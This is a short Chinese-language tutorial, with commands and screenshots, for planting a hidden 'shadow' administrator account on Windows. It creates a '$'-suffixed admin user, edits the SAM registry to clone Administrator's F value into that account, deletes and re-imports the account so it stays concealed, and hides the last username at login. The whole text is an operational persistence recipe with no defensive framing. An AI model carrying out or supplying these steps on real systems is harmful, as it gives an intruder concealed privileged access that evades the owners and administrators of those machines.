# Windows创建隐藏用户

# Windows创建隐藏用户

> 命令行输入`net user`查看用户

## 新建用户

命令行输入`net user test$ 123456 /add`创建隐藏用户，输入`net localgroup administrators test$ /add`将新建的用户移到管理组
	
## 导出test$和administrator用户注册表信息
运行输入`regedit`打开注册表
### 获取SAM权限

<img src="https://pic.imgdb.cn/item/64db35e61ddac507cc6171b4.jpg" style="zoom: 80%;" />

<img src="https://pic.imgdb.cn/item/64db36071ddac507cc61d287.jpg" style="zoom: 67%;" />

### 导出test$用户信息

路径：`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$`

<img src="https://pic.imgdb.cn/item/64db381d1ddac507cc66cacf.jpg" style="zoom:50%;" />

### 导出test$的UID值

<img src="https://pic.imgdb.cn/item/64db38ed1ddac507cc68ad15.jpg" style="zoom: 50%;" />

![](https://pic.imgdb.cn/item/64db393b1ddac507cc69588c.jpg)

### 导出administrator的UID项

用同样的方法导出administrator的UID项

都完成后桌面上有这些注册表文件：

![](https://pic.imgdb.cn/item/64db3a031ddac507cc6b28da.jpg)

​	

## 修改导出的注册表信息

将admin_uid中的F值，复制到uid中的F值

<img src="https://pic.imgdb.cn/item/64db3a6e1ddac507cc6c1a53.jpg" style="zoom:50%;" />

​	

## 删除test$用户，导入注册表

命令行输入：`net user test$ /del`删除test$用户

导入桌面上的 `test` 和 `uid` 注册表文件

导入 `test` ：

<img src="https://pic.imgdb.cn/item/64db3b741ddac507cc6e8217.jpg" style="zoom:67%;" />

导入`uid` 也一样

​	

## 设置登录时不显示最后的用户名

运行输入：`gpedit.msc`打开组策略

<img src="https://pic.imgdb.cn/item/64db3ccf1ddac507cc71aacb.jpg" style="zoom:67%;" />

<img src="https://pic.imgdb.cn/item/64db3cfe1ddac507cc721663.jpg" style="zoom: 67%;" />

